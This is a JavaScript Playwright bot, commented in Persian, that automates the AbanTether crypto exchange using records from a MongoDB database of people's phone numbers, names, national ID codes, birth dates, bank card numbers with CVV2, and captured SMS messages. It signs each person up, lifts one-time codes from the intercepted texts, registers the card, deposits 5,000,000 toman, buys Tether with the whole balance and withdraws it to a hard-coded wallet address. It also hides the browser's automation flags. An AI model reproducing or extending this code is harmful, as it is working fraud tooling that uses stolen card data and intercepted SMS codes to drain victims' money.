const { MongoClient } = require('mongodb');
const { chromium } = require('playwright');
require('dotenv').config();

class AbanTetherBot {
    constructor() {
        this.client = new MongoClient(process.env.MONGODB_URI);
        this.db = null;
        this.collection = null;
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set();
        this.isProcessing = false;
        
        // الگوهای جستجوی کد OTP
        this.otpPatterns = [
            /کد.*:.*?(\d{4,6})/i,
            /code.*:.*?(\d{4,6})/i,
            /(\d{4,6}).*آبان.*تتر/i,
            /آبان.*تتر.*(\d{4,6})/i
        ];
    }

    async connectToMongoDB() {
        try {
            await this.client.connect();
            this.db = this.client.db(process.env.DATABASE_NAME);
            this.collection = this.db.collection(process.env.COLLECTION_NAME);
            console.log('✅ Connected to MongoDB');
        } catch (error) {
            console.error('❌ MongoDB connection error:', error);
        }
    }

    async checkDatabase() {
        try {
            // پیدا کردن کاربرانی که پردازش نشده‌اند
            const pendingUsers = await this.collection.find({
                processed: { $ne: true },
                personalPhoneNumber: { $ne: "", $exists: true },
                personalName: { $ne: "", $exists: true },
                cardNumber: { $ne: "", $exists: true }
            }).toArray();

            console.log(`🔍 Found ${pendingUsers.length} pending users`);

            for (const user of pendingUsers) {
                const phone = user.personalPhoneNumber;
                
                // اگر شماره معتبر داره و در حال پردازش نیست
                if (phone && phone.trim() !== "" && !this.processingUsers.has(phone)) {
                    console.log(`🚀 Starting processing for user: ${phone}`);
                    this.processingUsers.add(phone);
                    this.currentUser = user;
                    
                    // پردازش غیرهمزمان
                    this.processUser(user).catch(error => {
                        console.error(`❌ Error processing user ${phone}:`, error);
                        this.processingUsers.delete(phone);
                    });
                }
            }
        } catch (error) {
            console.error('❌ Error checking database:', error);
        }
    }

    // تابع جدید: استخراج OTP از پیام‌های SMS
    async extractOTPFromSMS(smsArray, keyword = "آبان") {
        if (!smsArray || !Array.isArray(smsArray)) return null;
        
        // جستجو در پیام‌ها از جدید به قدیم
        const recentSMS = [...smsArray].reverse();
        
        for (const sms of recentSMS) {
            if (sms.body && sms.body.includes(keyword)) {
                for (const pattern of this.otpPatterns) {
                    const match = sms.body.match(pattern);
                    if (match && match[1]) {
                        console.log(`📱 Found OTP in SMS: ${match[1]}`);
                        return match[1];
                    }
                }
                
                // اگر با الگو پیدا نشد، سعی کن اعداد رو استخراج کن
                const numbers = sms.body.match(/\d{4,6}/g);
                if (numbers && numbers.length > 0) {
                    console.log(`📱 Extracted OTP: ${numbers[0]}`);
                    return numbers[0];
                }
            }
        }
        
        return null;
    }

    async processUser(user) {
        try {
            console.log(`🔄 Processing started for ${user.personalPhoneNumber}`);
            
            // مرحله 1: ثبت‌نام اولیه
            await this.initializeBrowser();
            await this.registerAndLogin(user);
            
            // مرحله 2: ثبت کارت
            await this.registerCard(user);
            
            // مرحله 3: واریز و خرید
            await this.depositAndBuy(user);
            
            // مرحله 4: برداشت
            await this.withdraw(user);
            
            // به‌روزرسانی وضعیت
            await this.updateUserStatus(user.personalPhoneNumber, "completed");
            
            console.log(`✅ Successfully completed for ${user.personalPhoneNumber}`);
            
        } catch (error) {
            console.error(`❌ Failed for ${user.personalPhoneNumber}:`, error.message);
            await this.updateUserStatus(user.personalPhoneNumber, "failed", error.message);
        } finally {
            this.processingUsers.delete(user.personalPhoneNumber);
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
            }
        }
    }

    async initializeBrowser() {
        if (this.browser) {
            await this.browser.close();
        }
        
        this.browser = await chromium.launch({ 
            headless: true, // در Railway باید true باشه
            args: [
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-software-rasterizer',
                '--window-size=1280,720'
            ]
        });
        
        const context = await this.browser.newContext({
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            viewport: { width: 1280, height: 720 },
            locale: 'fa-IR',
            timezoneId: 'Asia/Tehran'
        });
        
        await context.addInitScript(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'fa'] });
        });
        
        this.page = await context.newPage();
        
        // ردگیری درخواست‌ها برای دیباگ
        this.page.on('request', request => {
            if (request.url().includes('abantether')) {
                console.log(`🌐 Request: ${request.method()} ${request.url()}`);
            }
        });
        
        this.page.on('response', response => {
            if (response.url().includes('abantether')) {
                console.log(`🌐 Response: ${response.status()} ${response.url()}`);
            }
        });
    }

    async smartFindAndClick(text) {
        try {
            // روش‌های مختلف برای پیدا کردن المان
            const selectors = [
                `button:has-text("${text}")`,
                `a:has-text("${text}")`,
                `div:has-text("${text}")`,
                `span:has-text("${text}")`,
                `input[value="${text}"]`,
                `[role="button"]:has-text("${text}")`
            ];
            
            for (const selector of selectors) {
                const element = await this.page.$(selector);
                if (element) {
                    await element.click();
                    return true;
                }
            }
            
            // جستجو با XPath
            const xpath = `//*[contains(text(), '${text}') or contains(@value, '${text}')]`;
            const elements = await this.page.$x(xpath);
            if (elements.length > 0) {
                await elements[0].click();
                return true;
            }
            
            console.log(`⚠️ Could not find element with text: "${text}"`);
            return false;
        } catch (error) {
            console.error(`❌ Error clicking element with text "${text}":`, error.message);
            return false;
        }
    }

    async smartFill(placeholder, value) {
        try {
            const selectors = [
                `input[placeholder*="${placeholder}"]`,
                `input[name*="${placeholder.toLowerCase()}"]`,
                `input[type="text"]`,
                `input[type="number"]`,
                `input[type="tel"]`
            ];
            
            for (const selector of selectors) {
                const elements = await this.page.$$(selector);
                for (const element of elements) {
                    const isVisible = await element.isVisible();
                    const isEditable = await element.isEnabled();
                    if (isVisible && isEditable) {
                        await element.fill(value);
                        console.log(`✅ Filled ${placeholder}: ${value}`);
                        return true;
                    }
                }
            }
            
            console.log(`⚠️ Could not find input for placeholder: "${placeholder}"`);
            return false;
        } catch (error) {
            console.error(`❌ Error filling ${placeholder}:`, error.message);
            return false;
        }
    }

    async registerAndLogin(user) {
        console.log('📝 Starting registration...');
        
        try {
            // صفحه ثبت‌نام
            await this.page.goto('https://abantether.com/register', { 
                waitUntil: 'networkidle',
                timeout: 30000 
            });
            
            await this.sleep(5000);
            
            // وارد کردن شماره موبایل
            await this.smartFill('موبایل', user.personalPhoneNumber);
            await this.smartFill('شماره', user.personalPhoneNumber);
            await this.smartFill('تلفن', user.personalPhoneNumber);
            
            // کلیک ادامه
            await this.smartFindAndClick('ادامه');
            await this.sleep(5000);
            
            // منتظر OTP - بررسی پیام‌های جدید در دیتابیس
            console.log('⏳ Waiting for OTP login...');
            const otp = await this.waitForOTPInSMS(user.personalPhoneNumber, 'login');
            
            if (!otp) {
                throw new Error('OTP not found in SMS');
            }
            
            // وارد کردن OTP
            await this.smartFill('کد', otp);
            await this.smartFill('تایید', otp);
            await this.smartFill('کد تایید', otp);
            
            await this.smartFindAndClick('تایید');
            await this.sleep(5000);
            
            // پر کردن اطلاعات هویتی
            if (user.personalName) {
                await this.smartFill('نام', user.personalName);
            }
            
            if (user.personalNationalCode) {
                await this.smartFill('کد ملی', user.personalNationalCode);
            }
            
            // تاریخ تولد
            if (user.personalBirthDate) {
                try {
                    const birthDate = new Date(user.personalBirthDate);
                    const year = birthDate.getFullYear();
                    const month = String(birthDate.getMonth() + 1).padStart(2, '0');
                    const day = String(birthDate.getDate()).padStart(2, '0');
                    
                    await this.smartFill('سال', year.toString());
                    await this.smartFill('ماه', month);
                    await this.smartFill('روز', day);
                } catch (error) {
                    console.warn('⚠️ Could not parse birth date');
                }
            }
            
            // شهر و استان
            if (user.personalCity) {
                await this.smartFill('شهر', user.personalCity);
            }
            
            if (user.personalProvince) {
                await this.smartFill('استان', user.personalProvince);
            }
            
            await this.smartFindAndClick('ثبت');
            await this.sleep(5000);
            
            console.log('✅ Registration completed');
            
        } catch (error) {
            console.error('❌ Error in registration:', error.message);
            
            // عکس صفحه بگیر برای دیباگ
            await this.page.screenshot({ path: 'error-register.png' });
            throw error;
        }
    }

    async waitForOTPInSMS(phoneNumber, type = 'login', timeout = 120000) {
        console.log(`📱 Waiting for ${type} OTP for ${phoneNumber}...`);
        
        const startTime = Date.now();
        const checkInterval = 5000; // هر 5 ثانیه
        
        while (Date.now() - startTime < timeout) {
            try {
                // دریافت آخرین نسخه کاربر از دیتابیس
                const updatedUser = await this.collection.findOne({ 
                    personalPhoneNumber: phoneNumber 
                });
                
                if (updatedUser && updatedUser.sms && Array.isArray(updatedUser.sms)) {
                    const otp = await this.extractOTPFromSMS(updatedUser.sms);
                    
                    if (otp) {
                        console.log(`✅ ${type} OTP found: ${otp}`);
                        return otp;
                    }
                }
                
                console.log(`⏳ No OTP found yet, checking again in ${checkInterval/1000} seconds...`);
                await this.sleep(checkInterval);
                
            } catch (error) {
                console.error('❌ Error checking for OTP:', error.message);
                await this.sleep(checkInterval);
            }
        }
        
        throw new Error(`Timeout waiting for ${type} OTP`);
    }

    async registerCard(user) {
        console.log('💳 Registering card...');
        
        try {
            // رفتن به کیف پول
            await this.page.goto('https://abantether.com/wallet', { 
                waitUntil: 'networkidle',
                timeout: 30000 
            });
            
            await this.sleep(3000);
            
            // پیدا کردن دکمه اضافه کردن کارت
            await this.smartFindAndClick('اضافه کردن کارت');
            await this.smartFindAndClick('ثبت کارت جدید');
            await this.sleep(2000);
            
            // وارد کردن اطلاعات کارت
            if (user.cardNumber) {
                await this.smartFill('شماره کارت', user.cardNumber);
            }
            
            if (user.cvv2) {
                await this.smartFill('CVV', user.cvv2);
                await this.smartFill('cvv', user.cvv2);
            }
            
            if (user.bankMonth) {
                await this.smartFill('ماه', user.bankMonth.toString());
            }
            
            if (user.bankYear) {
                await this.smartFill('سال', user.bankYear.toString());
            }
            
            await this.smartFindAndClick('ثبت کارت');
            await this.sleep(3000);
            
            // منتظر OTP کارت
            console.log('⏳ Waiting for card registration OTP...');
            const otpCard = await this.waitForOTPInSMS(user.personalPhoneNumber, 'card');
            
            await this.smartFill('کد', otpCard);
            await this.smartFindAndClick('تایید');
            await this.sleep(5000);
            
            console.log('✅ Card registered');
            
        } catch (error) {
            console.error('❌ Error registering card:', error.message);
            await this.page.screenshot({ path: 'error-card.png' });
            throw error;
        }
    }

    async depositAndBuy(user) {
        console.log('💰 Starting deposit...');
        
        try {
            // واریز تومان
            await this.page.goto('https://abantether.com/deposit', { 
                waitUntil: 'networkidle',
                timeout: 30000 
            });
            
            await this.sleep(3000);
            
            // وارد کردن مبلغ
            await this.smartFill('مبلغ', '5000000');
            
            await this.smartFindAndClick('واریز');
            await this.sleep(3000);
            
            // منتظر OTP پرداخت
            console.log('⏳ Waiting for payment OTP...');
            const otpPayment = await this.waitForOTPInSMS(user.personalPhoneNumber, 'payment');
            
            await this.smartFill('کد', otpPayment);
            await this.smartFindAndClick('تایید');
            await this.sleep(5000);
            
            // خرید تتر
            console.log('🛒 Buying Tether...');
            await this.page.goto('https://abantether.com/market', { 
                waitUntil: 'networkidle',
                timeout: 30000 
            });
            
            await this.sleep(3000);
            
            await this.smartFindAndClick('خرید تتر');
            await this.sleep(2000);
            
            // انتخاب همه موجودی
            await this.smartFindAndClick('همه موجودی');
            await this.smartFindAndClick('خرید');
            await this.sleep(5000);
            
            console.log('✅ Deposit and purchase completed');
            
        } catch (error) {
            console.error('❌ Error in deposit/purchase:', error.message);
            await this.page.screenshot({ path: 'error-deposit.png' });
            throw error;
        }
    }

    async withdraw(user) {
        console.log('🏦 Starting withdrawal...');
        
        try {
            await this.page.goto('https://abantether.com/withdraw', { 
                waitUntil: 'networkidle',
                timeout: 30000 
            });
            
            await this.sleep(3000);
            
            // آدرس برداشت
            const withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
            await this.smartFill('آدرس', withdrawAddress);
            
            await this.smartFindAndClick('برداشت');
            await this.sleep(5000);
            
            // تأیید نهایی
            await this.smartFindAndClick('تایید نهایی');
            await this.sleep(3000);
            
            console.log('✅ Withdrawal completed');
            
        } catch (error) {
            console.error('❌ Error in withdrawal:', error.message);
            await this.page.screenshot({ path: 'error-withdraw.png' });
            throw error;
        }
    }

    async updateUserStatus(phoneNumber, status, error = null) {
        const updateData = {
            processed: true,
            status: status,
            completedAt: new Date(),
            lastUpdated: new Date()
        };
        
        if (error) {
            updateData.error = error.substring(0, 500); // محدود کردن طول خطا
            updateData.failedAt = new Date();
        }
        
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                { $set: updateData }
            );
            
            console.log(`📊 Updated status for ${phoneNumber}: ${status}`);
            
            if (error) {
                console.log(`📋 Error details: ${error}`);
            }
        } catch (dbError) {
            console.error('❌ Error updating database:', dbError.message);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async startPolling() {
        console.log('🔄 Starting database polling (every 30 seconds)...');
        
        // اولین چک
        await this.checkDatabase();
        
        // شروع پولینگ هر 30 ثانیه
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                console.error('❌ Error in polling interval:', error.message);
            }
        }, 30000); // 30 ثانیه
        
        // Health check endpoint
        const http = require('http');
        const server = http.createServer((req, res) => {
            res.writeHead(200, { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*' 
            });
            
            const status = {
                status: 'running',
                timestamp: new Date().toISOString(),
                processing: Array.from(this.processingUsers),
                memory: process.memoryUsage(),
                uptime: process.uptime()
            };
            
            res.end(JSON.stringify(status, null, 2));
        });
        
        const port = process.env.PORT || 8080;
        server.listen(port, () => {
            console.log(`🌐 Health check server running on port ${port}`);
            console.log(`📊 Visit http://localhost:${port} for status`);
        });
    }

    async start() {
        try {
            console.log('🤖 AbanTether Bot Starting...');
            console.log('📊 Configuration:');
            console.log(`  - Database: ${process.env.DATABASE_NAME}`);
            console.log(`  - Collection: ${process.env.COLLECTION_NAME}`);
            console.log(`  - Polling Interval: 30 seconds`);
            
            await this.connectToMongoDB();
            await this.startPolling();
            
        } catch (error) {
            console.error('❌ Failed to start bot:', error);
            process.exit(1);
        }
    }
}

// اجرای ربات
const bot = new AbanTetherBot();

// هندل خطاها
process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
    process.exit(1);
});

// اجرا
bot.start();